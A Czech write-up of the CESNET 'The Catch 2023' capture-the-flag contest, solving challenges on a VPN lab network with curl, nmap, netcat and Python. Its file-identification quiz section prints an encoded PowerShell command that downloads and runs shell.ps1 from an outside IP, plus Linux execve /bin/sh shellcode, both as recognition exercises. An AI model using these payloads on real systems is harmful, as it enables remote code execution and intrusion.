# The Catch 2023

Podobně jako předchozí roky, tak i letos CESNET uspořádal tradiční podzimní CTF
[The Catch](https://www.thecatch.cz/). V jednotlivých úlohách/výzvách bylo cílem
vždy získat "vlajku" – ukrytý kód skrývající se v různých podobách buď v
hacknutelných systémech nebo ve stažených souborech, všechno nějakým způsobem
imitující "hackování".

Povedlo se mi nakonec získat vlajku v 17 z 18 úloh a níže je můj write-up
popisující můj přístup k řešení každé úlohy.

## Sailor training center

### VPN access (1/1 bod)

> Ahoy, deck cadet,
>
> a lot of ship systems is accessible only via VPN. You have to install
> and configure OpenVPN properly. Configuration file can be downloaded
> from CTFd's link VPN. Your task is to activate VPN and visit the
> testing page.
>
> May you have fair winds and following seas!
>
> Testing page is available at http://vpn-test.cns-jv.tcc.

Podobně jako [loni](https://github.com/setnicka/thecatch2022), taková prerekvizita
pro mnoho dalších úloh. Stačilo si stáhnout vygenerovanou konfiguraci pro OpenVPN,
spustit OpenVPN a přečíst si vlajku na stránce na výše uvedené doméně.

S DNS byl opět na Linuxu drobný problém, je potřeba DNS server poskytnutý
po připojení OpenVPN serverem do systémového resolveru, což je ve Windows
automatické, v Linuxu kvůli rozmanitosti systémů bohužel ne. Ale naštěstí má
většina distribucí jako součást instalace OpenVPN i sbírku skriptů a stačí tak
do konfigurace dopsat jejich zavolání (`up` je akce při spuštění VPN, `down`
zase kace při vypnutí):

```conf
script-security 2
up /etc/openvpn/update-resolv-conf
down /etc/openvpn/update-resolv-conf
down-pre
```

Pak už jen spustíme OpenVPN a přečteme si vlajku:

```sh
$ sudo openvpn --config ctfd_ovpn.ovpn
$ curl -s http://vpn-test.cns-jv.tcc | grep -i flag
 <h1>Confirmation code: <tt>FLAG{smna-m11d-hhta-ONOs}</tt></h1>
```

### Treasure map (1/1 bod)

> Ahoy, deck cadet,
>
> working with maps and searching for treasures is every sailor's daily routine,
> right? Your task is to examine the map and find any hidden secrets.
>
> May you have fair winds and following seas!
>
> Download the [treasure map](https://owncloud.cesnet.cz/index.php/s/mEUTtvkE8zsgZVf/download).

Na zadaném obrázku je pirátská mapa v PNG, na které jsou lehce znát písmenka.
Abychom se při čtení netrápili, tak v GIMPu vybereme jednolitě barevné pozadí
(s nastavením prahu na 0, abychom nevybrali nic jiného) a změníme mu barvu, aby
se nám pak vlajka lépe četla:

| Původní mapa                          |  Začerněná mapa                         |
| ------------------------------------- | --------------------------------------- |
| ![](01_Treasure_Map/treasure_map.png) | ![](01_Treasure_Map/treasure_map_2.png) |

Pak už jen čteme `FLAG{WIFI-AHEA-DCAP-TAIN}`.

### Captain's coffee (1/1 bod)

> Ahoy, deck cadet,
>
> your task is to prepare good coffee for captain. As a cadet, you are
> prohibited from going to the captain's cabin, so you will have to solve the
> task remotely. Good news is that the coffee maker in captain's cabin is online
> and can be managed via API.
>
> May you have fair winds and following seas!
>
> Coffee maker API is available at http://coffee-maker.cns-jv.tcc.

Toto byla jednoduchá úložka na práci s [RESTovým API](https://cs.wikipedia.org/wiki/REST),
taková rozcvička. Na adrese ze zadání dostaneme JSON, který nám radí podívat se na dokumentaci:

```sh
$ curl http://coffee-maker.cns-jv.tcc/
{"status":"Coffemaker ready","msg":"Visit /docs for documentation"}
```

Po návštěvě `/docs` pak dostáváme [OpenAPI specifikaci](06_Captains_coffee/openapi.json),
ve které se dozvíme o několika zajímavých endpointech, především `GET /coffeeMenu`
a pak `POST /makeCoffee`. Tak zjistíme, co za kávu nabízejí, a zkusíme nějakou
připravit.

```sh
curl http://coffee-maker.cns-jv.tcc/coffeeMenu | jq
```
```json
{
  "Menu": [
    {
      "drink_name": "Espresso",
      "drink_id": 456597044
    },
    {
      "drink_name": "Lungo",
      "drink_id": 354005463
    },
    {
      "drink_name": "Capuccino",
      "drink_id": 234357596
    },
    {
      "drink_name": "Naval Espresso with rum",
      "drink_id": 501176144
    }
  ]
}
```

Až potuď by úlohu šlo vyřešit i v browseru, ale pro ruční poslání POST requestu
je nejjednodušší asi použít `curl`. Abychom nemuseli zkoušet všechny kávy, tak
si můžeme pomocí `jq` vysekat jen jejich `drink_id` a pak pro každé z nich
zkusit připravit kávu.

Jak vzápětí zjistíme, tak by stačilo vybrat si jakékoliv `drink_id`, protože
na všechny dostaneme stejnou odpověď s vlajkou :)

```sh
curl -s http://coffee-maker.cns-jv.tcc/coffeeMenu | jq '.Menu.[].drink_id' | while read id; do
        curl -X POST -H 'Content-Type: application/json' http://coffee-maker.cns-jv.tcc/makeCoffee/ -d "{\"drink_id\": $id}" | jq;
done
```
```json
{
  "message": "Your Naval Espresso with rum is ready for pickup",
  "validation_code": "Use this validation code FLAG{ccLH-dsaz-4kFA-P7GC}"
}
```

### Ship web server (1/1 bod)

> Ahoy, deck cadet,
>
> there are rumors that on the ship web server is not just the official
> presentation. Your task is to disprove or confirm these rumors.
>
> May you have fair winds and following seas!
>
> Ship web server is available at http://www.cns-jv.tcc.
>
> Hint: Check the content of the certificate of the web.

Další rozcvičková úloha, ale už o krapet složitější. V zadání dostáváme adresu,
která nás přesměruje na svou HTTPS verzi podepsanou neznámým certifikátem.
Certifikát ani nemůže být validní, protože pro TLD `.tcc` běžící jenom za VPNkou
by ho nikdo asi žádný velký vydavatel certifikátů nevydal a nezaručil se za něj.
V rámci řešení CTFka ale můžeme s opatrností pokračovat.

Zobrazí se nám stránka, která v patičce má `ver. RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ==`,
to nápadně připomíná [base64 enkódování](https://cs.wikipedia.org/wiki/Base64),
zkusme si ho přeložit na text:

```sh
$ echo "RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ==" | base64 -d
FLAG{    -    -    -    }
```

To vypadá zajímavě, ale části vlajky nám scházejí. Hint nám však radí, abychom
prozkoumali certifikát. A vskutku, certifikát je vydaný i pro několik dalších
domén:

* documentation.cns-jv.tcc
* home.cns-jv.tcc
* pirates.cns-jv.tcc
* structure.cns-jv.tcc

Žádná z nich se bohužel neresolvuje na IP adresu, ale pokud je certifikát vydaný
pro více domén, tak to může znamenat, že všechny běží na tom stejném stroji.
Použijeme tedy IP adresu stroje z funkční domény, ale v `Host` HTTP hlavičce
mu předáme ostatní domény. To jde udělat pomocí `curl` například jako níže
(namísto IP adresy `www.cns-jv.tcc` tak rovnou používáme tuto doménu).

Na každém webu je nějaká stránka opět s base64 verzí uvedenou někde na stránce,
Vhodným použitím příkazů `grep`, `sed` a `base64` tak vytáhneme části vlajky:

```sh
$ curl -s -H "Host: home.cns-jv.tcc" -k https://www.cns-jv.tcc/style.css | sed 's/.*"ver. \(.*\)".*/\1/' | base64 -d
FLAG{    -    -    -gMwc}
$ curl -s -H "Host: home.cns-jv.tcc" -k https://www.cns-jv.tcc/?user=abc | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{ejii-    -    -    }j
$ curl -s -H "Host: pirates.cns-jv.tcc" -k https://www.cns-jv.tcc/ | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{    -    -Q53C-    }
$ curl -s -H "Host: structure.cns-jv.tcc" -k https://www.cns-jv.tcc/ | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{    -plmQ-    -    }
```

… a finálně složíme `FLAG{ejii-plmQ-Q53C-gMwc}`. Toto už byla první zajímavější
úloha a předzvěst narůstající obtížnosti.

## Crew drills

### Sonar logs (2/2 body)

> Ahoy, officer,
>
> each crew member must be able to operate the sonar and understand its logs.
> Your task is to analyze the given log file, and check out what the sonar has
> seen.
>
> May you have fair winds and following seas!
>
> Download [the logs](https://owncloud.cesnet.cz/index.php/s/5ZpEExdDf4ZBW1E/download).
>
> Update: Be aware that some devices do not use up-to-date libraries - this
> sonar, for example, is based on python and uses an old `pytz` library version
> 2020.4.

Stáhneme si soubor [`sonar.log`](09_Sonar_logs/sonar.log) a podíváme se do něj:

```
2023-10-01 22:51:22 Pacific/Honolulu - Transmitters activated
2023-10-02 00:32:51 US/Pacific - Receiver 5 up
2023-10-02 00:33:45 America/Vancouver - Preprocessor up
2023-10-02 00:52:22 America/Creston - Object detected in depth 65 (0x41)
2023-10-02 01:30:48 America/Belize - Power generator up
2023-10-02 01:34:28 America/Inuvik - Graphical UI up
2023-10-02 01:34:59 America/Mazatlan - Transmitters activated
2023-10-02 01:42:58 Mexico/BajaSur - Transmitters activated
2023-10-02 01:49:54 US/Pacific - Object detected in depth 114 (0x72)
...
```

Každá řádka logu obsahuje časový údaj včetně časové zóny. Jsou teď seřazené
lexikograficky, ale nejsou seřazené správně podle času s ohledem na časové zóny.
Pak je zde spousta balastu a pak řádky logu, které nesou ještě další informaci – hloubku
v číslech mezi 45 a 125. Cvičenému hackerovi to okamžitě evokuje, že by hloubky
mohly být čísla písmen (a znaků `-`, `{` a `}`) v [ASCII tabulce](https://cs.wikipedia.org/wiki/ASCII).

Než ale záznamy řadit ručně a pak ještě převádět čísla na písmenka, tak si na to
radši napíšeme krátký prográmek v Pythonu. Zde pak přijde vhod hint, že pro
převod názvů časových pásem máme použít [pytz](https://pypi.org/project/pytz/)
knihovnu verze 2020.4, protože názvy časových pásem v ní se dost měnily
(bohužel `pytz` nepoužívá moc standardizované názvy).

Abychom si mohli pořídit správnou verzi knihovny, i když už máme v systému novější,
tak si pořídíme Python venv (virtual environment), kde si můžeme verzi knihovny
nadiktovat (pokud je tato verze na [PyPI](https://pypi.org/)).

Vyrobíme si soubor [`requirements.txt`](09_Sonar_logs/requirements.txt) a pak
založíme venv a instalujeme do něj správnou verzi:

```sh
$ cat requirements.txt
pytz==2020.4
python-dateutil

# Vyrobení prázdného venv ve složce venv
$ python3 -m venv venv

# Aktivujeme venv, od této chvíle příkazy jako python3 a pip3 operují s ním
$ . venv/bin/activate

# Instalace balíčků
(venv) $ pip3 install -r requirements.txt
```

Pak si napíšeme skript, který načte všechny řádky logu, naparsuje je, seřadí
podle času a převede na písmenka.

```sh
(venv) $ python3 solve.py < sonar.log
FLAG{3YAG-2rbj-KWoZ-LwWm}
```

### Regular cube (2/2 body)

> Ahoy, officer
>
> knowledge of regular expressions is crucial for all sailors from CNS fleet. A
> 3D crossword puzzle is available to enhance this skill.
>
> May you have fair winds and following seas!
>
> Download [the regular cube crossword](https://owncloud.cesnet.cz/index.php/s/xfEjEaKkAuSVmPB/download).

Na uvedeném odkazu stáhneme soubor [`regular_cube.pdf`](10_Regular_cube/regular_cube.pdf),
což je 3D křížovka s [regulárními výrazy](https://cs.wikipedia.org/wiki/Regul%C3%A1rn%C3%AD_v%C3%BDraz)
(aneb regexy) pro každý řádek/sloupec ve všech třech osách.

Dá se postupovat od těch jasných regexů a postupně doplňovat. Na počítači
doporučuji na doplňování [Xournal++](https://github.com/xournalpp/xournalpp).

Moje řešení:

* [`regular_cube.xopp`](10_Regular_cube/regular_cube.xopp)
* [`regular_cube_solve.pdf`](10_Regular_cube/regular_cube_solve.xopp)

Nakonec vyšla tajenka, která je tentokrát (pro vyvarování se náhodných hloupých
chybiček) docela normální text: `FLAG{NICE-NAVY-BLUE-CUBE}`.

### Web protocols (2/2 body)

> Ahoy, officer,
>
> almost all interfaces of the ship's systems are web-based, so we will focus
> the exercise on the relevant protocols. Your task is to identify all webs on
> given server, communicate with them properly and assembly the control string
> from responses.
>
> May you have fair winds and following seas!
>
> The webs are running on server `web-protocols.cns-jv.tcc`.
>
> Hint: Be aware that `curl` tool doesn't do everything it claims.

Tato úloha mě potrápila jako jedna z nejvíce.

První věc, kterou můžeme udělat, když dostaneme adresu nějakého počítače, je
podívat se, co na něm vlastně běží. Můžeme zkusit otevřít spojení na všechny
jeho TCP porty nástrojem `nmap` a zjistíme, na kterých portech je nám počítač
ochotný odpovědět. Často se z toho dá zjistit, jaké všechny služby tam běží.

Protože `nmap` normálně skenuje jen nejčastější běžné porty, tak mu ještě
pomocí přepínače `-p` vysvětlíme, co má skenovat (`-` je celý rozsah do 65535):

```sh
$ nmap -p- web-protocols.cns-jv.tcc
PORT     STATE SERVICE
5009/tcp open  airport-admin
5011/tcp open  telelpathattack
5020/tcp open  zenginkyo-1
8011/tcp open  unknown
8020/tcp open  intu-ec-svcdisc
```

Zkusíme na ně postupně poslat curl, abychom zjistili, jestli na nich běží
nějaký web (když se úloha jmenuje "Web protocols"). Na většině z nich dostaneme
nějaké obrázky kódované v base64:

```sh
$ curl -s http://web-protocols.cns-jv.tcc:5009
Unsupported protocol version

$ curl -s http://web-protocols.cns-jv.tcc:5011 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# base64 encoded obrázek 2 koček (md5sum 67d46a3428164097d498759f999bbaed)
# podle hlaviček Python/werkzeug

$ curl -s http://web-protocols.cns-jv.tcc:5020 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# base64 encoded obrázek 3 koček (md5sum 403b24ed73b4ea06ce23c001a04a176d)
# podle hlaviček Python/werkzeug

$ curl -s http://web-protocols.cns-jv.tcc:8011 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# znovu base64 encoded obrázek 2 koček (md5sum 67d46a3428164097d498759f999bbaed)
# podle hlaviček nginx

$ curl -s -k https://web-protocols.cns-jv.tcc:8020/ | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# zabezpečený base64 encoded obrázek 3 koček (md5sum 403b24ed73b4ea06ce23c001a04a176d)
# podle hlaviček nginx
```

Z obrázků nic moc nevykoukáme, nanejvýše odhadneme, že nám ještě asi chybí
obrázek s jednou kočkou. Všimneme si ale cookies, které nám přišly nazpátek
v hlavičce `Set-Cookie`:

```sh
$ curl -v http://web-protocols.cns-jv.tcc:5011 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=LXJ2YnEtYWJJ; Path=/
$ curl -v http://web-protocols.cns-jv.tcc:5020 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=Ui00MzNBfQ==; Path=/
$ curl -v http://web-protocols.cns-jv.tcc:8011 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=LXJ2YnEtYWJJ; Path=/
$ curl -vk https://web-protocols.cns-jv.tcc:8020 2>&1 >/dev/null | grep -i Set-Cookie
< set-cookie: SESSION=Ui00MzNBfQ==; Path=/
```

* `LXJ2YnEtYWJJ` je base64 encoded `-rvbq-abI`
* `Ui00MzNBfQ==` je base64 encoded `R-433A}`

Schází nám ještě první část vlajky, zatím máme `FLAG{....-rvbq-abIR-433A}`.

Další věcí, které si můžeme všimnout, je to, že Python servery odpovídají
protokolem HTTP/1.0, Nginx pak HTTP/1.1 a HTTP/2, nemůže ten první endpoint být
[původní HTTP, dnes nazývané HTTP/0.9](https://www.w3.org/Protocols/HTTP/AsImplemented.html)?
To neposílalo v requestu žádnou verzi a request tak vypadal jen jako `GET /cesta`
(narozdíl třeba od HTTP/1.1, kde vypadá jako `GET /cesta HTTP/1.1`).

Protože `curl` podle hintu HTTP/0.9 neposílá správně, tak to můžeme udělt ručně
přes netcat třeba takto:

```sh
$ echo "GET /" | nc 10.99.0.122 5009
HTTP/1.1 400 Bad Request

Unsupported protocol version
```

Až sem byla úloha velmi hezká. Ale bohužel po vyzkoušení tohoto a obdržení
výše uvedené odpovědi jsem po dlouhém snažení úlohu odložil k ledu a vrátil se
k ní až později. Endpoint totiž odpovídal tak, jako kdyby provozoval HTTP/1.1,
ale ať do něj člověk poslal cokoliv, odpověděl mu v podstatě vždy stejně.

Až po mnoha pokusech a asi třetímu navrácení k úloze jsem si řekl, co když to
autoři udělali blbě a stvořili protokol, který nikdy neexistoval? A ano!

```sh
$ echo "GET / HTTP/0.9" | nc 10.99.0.122 5009
HTTP/0.9 200 OK

SESSION=RkxBR3trckx0; iVBORw0KGgoA...
# data jsou obrázek s jednou kočkou
```

Rád bych ale řekl, že nic takového nikdy v historii neexistovalo a úloha byla
kvůli tomu dost matoucí a nemám z ní moc dobré pocity, i když mohla být
skutečně hezká :(

Finálně pak už jen dekódujeme `RkxBR3trckx0`, získáme `FLAG{krLt` a sestavíme
celou vlajku: `FLAG{krLt-rvbq-abIR-433A}`

| HTTP/0.9 kočka                 | HTTP/1.1 kočky                 | HTTP/2.0 kočky                 |
| ------------------------------ | ------------------------------ | ------------------------------ |
| ![](11_Web_protocols/5009.png) | ![](11_Web_protocols/5011.png) | ![](11_Web_protocols/5020.png) |

### Alpha-Zulu quiz (3/3 body)

> Ahoy, officer
>
> your task is to pass a test that is part of the crew drill. Because of your
> rank of third officer, you must lead the crew by example and pass the test
> without a single mistake.
>
> May you have fair winds and following seas!
>
> The quiz webpage is available at <http://quiz.cns-jv.tcc>.

Na uvedené URL byl kvíz, který vždy ukázal část nějakého souboru nebo obecně
datového formátu a úkolem bylo vždy správně zvolit odpověď ze čtyř nabízených.
Teprve až po zodpovězení všech 20 otázek správně se zobrazila vlajka `FLAG{QOn7-MdEo-9cuH-aP6X}`.

Užitečné odkazy:

* [Seznam signatur běžných souborů](https://en.wikipedia.org/wiki/List_of_file_signatures) na Wikipedii

**JSON Web Token (JWT):**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkRvZSBKb2huIiwiaWF0IjoxNTE2MjM5MDIyfQ.Aqma4g_FzStCaLSyvpRgKLNIgM4now17FXwSHsBlwag
```

Po base64 dekódování první části z toho vypadne `{"alg":"HS256","typ":"JWT"}`.

**WordPress hash:**

```
$P$BlW9FsUwJM0142LDsjtDsPUBHPVPIf/
```

Je to na první pohled nějaký hash hesla (na začátku pomocí `$` oddělený nějaký
parametr). Po chvíli hledání možností lze najít ukázky WordPress hashů
vypadající podobně.

**ZIP archive:**

```
00000000  50 4b 03 04 14 00 00 00 08 00 39 9b c7 56 db 90  |PK........9.ÇVÛ.|
00000010  a9 3d 19 00 00 00 10 00 00 00 08 00 00 00 66 69  |©=............fi|
00000020  6c 65 2e 74 78 74 05 40 b1 09 00 30 0c 7a c5 d7  |le.txt.@±..0.zÅ×|
00000030  84 b8 45 5a 30 ef 0f 92 67 21 f4 5f 61 78 2c 50  |.¸EZ0ï..g!ô_ax,P|
00000040  4b 01 02 14 00 14 00 00 00 08 00 39 9b c7 56 db  |K..........9.ÇVÛ|
00000050  90 a9 3d 19 00 00 00 10 00 00 00 08 00 00 00 00  |.©=.............|
00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 66 69 6c  |.............fil|
00000070  65 2e 74 78 74 50 4b 05 06 00 00 00 00 01 00 01  |e.txtPK.........|
00000080  00 36 00 00 00 3f 00 00 00 00 00                 |.6...?.....|
# ZIP archive
```

Je to hexdump, vlevo jsou adresy, uprostřed bajty zapsané hexadecimálně, napravo
přepis do ASCII. Podle prvních dvou bajtů `PK` je to ZIP archiv.

**Windows PE executable:**

```
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
```

Opět hexdump, jen jinak seskupený (výstup z jiného programu). Podle prvních
několika bajtů identifikujeme PE executable.

**ELF binary:**

```
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 7033 0000 0000 0000  ..>.....p3......
00000020: 4000 0000 0000 0000 f8b1 0000 0000 0000  @...............
00000030: 0000 0000 4000 3800 0d00 4000 1e00 1d00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: d802 0000 0000 0000 d802 0000 0000 0000  ................
```

Hexdump, podle prvních několika bajtů (podle toho se i jmenuje :D)

**Microsoft EVTX file signature:**

```
0000000: 456c 6646 696c 6500 0000 0000 0000 0000  ElfFile.........
0000010: d300 0000 0000 0000 375e 0000 0000 0000  ........7^......
```

Opět hexdump, šlo poznat podle začátku souboru.

**UTF-16 Little Endian encoded data:**

```
00000000  49 00 45 00 58 00 28 00 4e 00 65 00 77 00 2d 00  |I.E.X.(.N.e.w.-.|
00000010  4f 00 62 00 6a 00 65 00 63 00 74 00 20 00 4e 00  |O.b.j.e.c.t. .N.|
00000020  65 00 74 00 2e 00 57 00 65 00 62 00 43 00 6c 00  |e.t...W.e.b.C.l.|
00000030  69 00 65 00 6e 00 74 00 29 00 2e 00 64 00 6f 00  |i.e.n.t.)...d.o.|
00000040  77 00 6e 00 6c 00 6f 00 61 00 64 00 53 00 74 00  |w.n.l.o.a.d.S.t.|
00000050  72 00 69 00 6e 00 67 00 28 00 27 00 68 00 74 00  |r.i.n.g.(.'.h.t.|
00000060  74 00 70 00 3a 00 2f 00 2f 00 31 00 30 00 2e 00  |t.p.:././.1.0...|
00000070  31 00 30 00 2e 00 31 00 34 00 2e 00 33 00 31 00  |1.0...1.4...3.1.|
00000080  2f 00 73 00 68 00 65 00 6c 00 6c 00 2e 00 70 00  |/.s.h.e.l.l...p.|
00000090  73 00 31 00 27 00 29 00                          |s.1.'.).|
```

UTF-16 kóduje každé písmeno do dvou bajtů (16 bitů), takže podle pravé části
hexdumpu je hned vidět, že je to UTF-16.

**Java Serialized hex stream:**

```
ac ed 00 05 75 72 00 13 5b 4c 6a 61 76 61 2e 6c
61 6e 67 2e 53 74 72 69 6e 67 3b ad d2 56 e7 e9
1d 7b 47 02 00 00 78 70 00 00 00 02 74 00 21 44
3a 2f 77 69 6e 33 32 61 70 70 2f 61 70 6c 69 63
61 74 69 6f 6e 2f 62 69 6e 61 72 79 2e 65 78 65
74 00 09 2d 2d 76 65 72 73 69 6f 6e
```

Hexadecimální data. Podle prvních dvou bajtů lze dohledat.

**Base64 encoded data:**

```sh
$ echo 'dGhpc2lzYXRlc3RzdHJpbmcx' | base64 -d
thisisateststring1
```

**Base32 encoded data:**

```sh
$ echo 'ORUGS43JONQXIZLTORZXI4TJNZTTC===' | base32 -d
thisisateststring1
```

**XOR obfuscated string:**

```
00000000  41 4c 41 0c 51 47 50 54 47 50 0c 46 4d 4f 43 4b  |ALA.QGPTGP.FMOCK|
00000010  4c 0c 58 4b 52 18 16 16 11                       |L.XKR....|
```

**Timestamp:**

`1609549323` -> Saturday 2. January 2021 1:02:03

**PHP serialized object:**

```
O:8:"MyClass":2:{s:4:"name";s:9:"John Doe";s:3:"age";i:25;}`
```

Serializace v PHP je docela přímočará, `O` je objekt, `8` je délka názvu včetně
nullbyte na konci a tak dále.

**Linux x86 shellcode:**

```
\x31\xc0\x50\x68\x2f\x2f\x53\x48\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

**GZip hex stream:**

```sh
$ echo '1f 8b 08 00 4f bd 80 64 00 ff 05 40 b1 09 00 30 0c 7a c5 d7 84 b8 45 5a 30 ef 0f 92 67 21 f4 5f 61 78 2c db 90 a9 3d 10 00 00 00' | xxd -r -p | file -
/dev/stdin: gzip compressed data, last modified: Wed Jun  7 17:24:31 2023
```

Tady jsme si pomohli utilitkou `xxd`, která z hexadecimálního zápisu udělala
nazpět binární data a pak jsme je poslali do utilitky `file`, která poznává
soubory podle jejich začátku.

**.NET ViewState value:**

```sh
echo '/wEPDwULLTE2MTY2ODcyMjkPFgQeCFVzZXJOYW1lBQ5EYXNndXB0YSBTaHViaB4IUGFzc3dvcmQFDElBbUFQYXNzd29yZGRk2/xP37hKKE9jfGYYzFjLuwpi6rHlPdXhfSspF6YRZiI=' | base64 -d
�
 -161668722UserNameDasgupta ShubPassword
                                        IAmAPassworddd��O߸J(Oc|f�X˻
b��=��}+)�f"
# .NET ViewState value
```

Na první pohled base64 zakódovaná data, z výstupu pak šlo odhadnout, že nic
jiného to být nemůže.

**Encoded PowerShell command:**

```sh
$ echo 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMAMQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=' | base64 -d
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')
```

Opět base64 zakódovaná data, výstup pak byl opět jasný.

**SHA1 a MD5:**

* `40bd001563085fc35165329ea1ff5c5ecbdbbeef` -> SHA1 (správná délka)
* `202cb962ac59075b964b07152d234b70` -> MD5 sum (správná délka)

**Java Serialized data:**

```sh
$ echo 'rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0ACFEOi93aW4zMmFwcC9hcGxpY2F0aW9uL2JpbmFyeS5leGV0AAktLXZlcnNpb24=' | base64 -d
��ur[Ljava.lang.String;��V��{Gxpt!D:/win32app/aplication/binary.exet	--version
```

Po dekódování z base64 šlo poznat.
